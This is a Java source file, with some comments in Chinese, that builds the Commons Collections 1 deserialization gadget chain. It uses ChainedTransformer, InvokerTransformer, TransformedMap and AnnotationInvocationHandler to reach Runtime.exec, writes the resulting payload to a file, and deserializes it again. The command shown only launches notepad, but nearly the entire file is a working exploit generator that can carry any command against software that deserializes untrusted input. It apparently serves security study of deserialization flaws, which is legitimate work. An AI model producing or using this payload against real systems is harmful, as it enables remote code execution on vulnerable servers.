import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import javax.annotation.Generated;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class CC1WithTransformedMap {

    public static String fileName = "CC1withTransformedMap.bin";

    public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException,
            InstantiationException, IllegalAccessException, IOException {

        String command = "notepad";
        Map hashMap = new HashMap();
        // 这里 key 一定是 下面实例化 AnnotationInvocationHandler 时传入的注解类中存在的属性值
        // 并且这里的值的一定不是属性值的类型
        hashMap.put("comments", 2);

        // 结合 ChainedTransformer
        ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{command})
        });


        Map      transformedMap = TransformedMap.decorate(hashMap, null, chain);
        Class<?> c              = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

        Constructor<?> constructor = c.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Generated.class, transformedMap);

        SerializeUtil.writeObjectToFile(handler, fileName);
		SerializeUtil.readFileObject(fileName);
    }
}